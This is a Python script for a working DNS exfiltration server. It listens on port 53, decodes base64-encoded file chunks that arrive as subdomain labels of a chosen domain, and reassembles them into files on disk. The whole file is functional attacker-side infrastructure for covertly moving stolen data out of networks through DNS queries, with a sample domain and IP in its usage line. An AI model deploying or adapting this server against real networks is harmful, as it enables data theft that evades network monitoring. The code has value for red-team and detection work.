#!/usr/bin/env python3
"""
DNS Exfiltration Server – controlled IP return for apex

Usage:
    sudo python3 dns_exfil_server.py --domain dnsdemo.andrewrea.co.uk --ip 52.56.139.78
"""

import os
import base64
import argparse
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A

class ExfilResolver(BaseResolver):
    def __init__(self, base_domain: str, apex_ip: str):
        self.base = base_domain.strip(".").lower().split(".")
        self.sessions = {}  # domain → session metadata
        self.apex_ip = apex_ip

    def resolve(self, request, handler):
        qname = str(request.q.qname).strip(".")
        labels = qname.split(".")
        labels_lc = [l.lower() for l in labels]

        if labels_lc[-len(self.base):] != self.base:
            return request.reply()  # ignore unrelated

        domain_key = ".".join(self.base)
        base_dir = os.path.join("exfil_data", domain_key)
        os.makedirs(base_dir, exist_ok=True)

        # ───── handle apex (just domain with no subdomain)
        if len(labels_lc) == len(self.base):
            reply = request.reply()
            reply.add_answer(RR(
                rname=request.q.qname,
                rtype=QTYPE.A,
                rclass=1,
                ttl=60,
                rdata=A(self.apex_ip)
            ))
            return reply

        # ───── session start
        if labels_lc[0] == "path":
            file_path = labels[1].replace("_", "/")
            self.sessions[domain_key] = {
                "path": file_path,
                "chunks": {},
                "last": -1
            }
            print(f"[+] session start → {file_path}")

        # ───── eof → write file
        elif labels_lc[0] == "eof":
            self._flush(domain_key)

        # ───── chunk
        elif domain_key in self.sessions:
            session = self.sessions[domain_key]
            try:
                for i, lbl in enumerate(labels):
                    if lbl.isdigit():
                        index = int(lbl)
                        chunk_part = "".join(labels[:i])
                        break
                else:
                    raise ValueError("no numeric index")

                padded = chunk_part + "=" * ((4 - len(chunk_part) % 4) % 4)
                data = base64.urlsafe_b64decode(padded.encode())
                session["chunks"][index] = data
                session["last"] = max(session["last"], index)
                print(f"[✓] chunk {index} ({len(data)} bytes) stored")
            except Exception as e:
                print(f"[!] chunk parse error: {e}")

        # ───── default reply
        reply = request.reply()
        reply.add_answer(RR(
            rname=request.q.qname,
            rtype=QTYPE.A,
            rclass=1,
            ttl=60,
            rdata=A(self.apex_ip)
        ))
        return reply

    def _flush(self, key: str):
        sess = self.sessions.get(key)
        if not sess:
            print("[!] flush failed: no session")
            return

        out_path = os.path.join("exfil_data", key, sess["path"].lstrip("/"))
        os.makedirs(os.path.dirname(out_path), exist_ok=True)

        with open(out_path, "wb") as f:
            for i in range(sess["last"] + 1):
                f.write(sess["chunks"].get(i, b""))

        print(f"[✓] wrote file → {out_path}")

# ───── entrypoint
if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="DNS Exfiltration Server")
    ap.add_argument("--domain", required=True, help="e.g. dnsdemo.andrewrea.co.uk")
    ap.add_argument("--ip",      required=True, help="IP to return for apex queries")
    ap.add_argument("--port",    type=int, default=53)
    args = ap.parse_args()

    resolver = ExfilResolver(args.domain, args.ip)
    udp = DNSServer(resolver, port=args.port, address="0.0.0.0", tcp=False)
    tcp = DNSServer(resolver, port=args.port, address="0.0.0.0", tcp=True)

    print(f"[*] listening on :{args.port} for {args.domain} → IP {args.ip}")
    udp.start_thread(); tcp.start_thread()

    try:
        while True: pass
    except KeyboardInterrupt:
        print("\n[!] shutdown")

